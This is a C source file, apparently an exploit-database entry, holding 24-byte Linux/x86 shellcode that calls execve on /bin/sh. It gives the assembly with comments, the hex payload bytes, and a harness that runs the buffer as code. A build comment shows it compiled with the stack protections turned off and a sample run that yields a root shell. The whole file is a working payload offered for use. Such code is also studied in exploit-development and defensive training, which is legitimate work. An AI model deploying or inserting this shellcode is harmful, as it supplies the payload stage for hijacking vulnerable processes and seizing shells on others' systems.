/*
; Title: Linux/x86 execve "/bin/sh" - shellcode 24 byte
; Platform: linux/x86
; Date: 2015-01-03
; Author: Dennis 'dhn' Herrmann
; Website: https://zer0-day.pw

BITS 32

global _start
section .text

; syscalls kernel
SYS_EXECVE equ 0x0b

_start:

	; execve("/bin//sh", 0, 0);
	push SYS_EXECVE ; SYS_EXECVE = 11
	pop eax         ; set SYS_EXECVE to eax

	xor esi, esi    ; clean esi
	push esi        ; esi is zero
	push 0x68732f2f ; push 'hs//'
	push 0x6e69622f ; push 'nib/'

	; execve("/bin//sh/", 0, 0);
	;             ^
	;             |
	;            ebx
	mov ebx, esp

	; execve("/bin//sh/", 0, 0);
	;                     ^
	;                     |
	;                    ecx
	xor ecx, ecx    ; clean ecx

	; execve("/bin//sh/", 0, 0);
	;                        ^
	;                        |
	;                       edx
	mov edx, ecx    ; set zero to edx
	int 0x80        ; syscall execve
*/

/*
 * $ gcc -fno-stack-protector -z execstack shellcode.c -o shellcode
 * $ ./shellcode
 *  Shellcode Length:  24
 *  # id
 *  uid=0(root) gid=0(root) groups=0(root)
 */

#include <stdio.h>
#include <string.h>

char shellcode[] = {
	"\x6a\x0b"                      /* push   0xb */
	"\x58"                          /* pop    eax */
	"\x31\xf6"                      /* xor    esi,esi */
	"\x56"                          /* push   esi */
	"\x68\x2f\x2f\x73\x68"          /* push   0x68732f2f */
	"\x68\x2f\x62\x69\x6e"          /* push   0x6e69622f */
	"\x89\xe3"                      /* mov    ebx,esp */
	"\x31\xc9"                      /* xor    ecx,ecx */
	"\x89\xca"                      /* mov    edx,ecx */
	"\xcd\x80"                      /* int    0x80 */
};

int main()
{
	printf("Shellcode Length:  %d\n", (int)strlen(shellcode));
	int (*ret)() = (int(*)())shellcode;
	ret();

	return 0;
}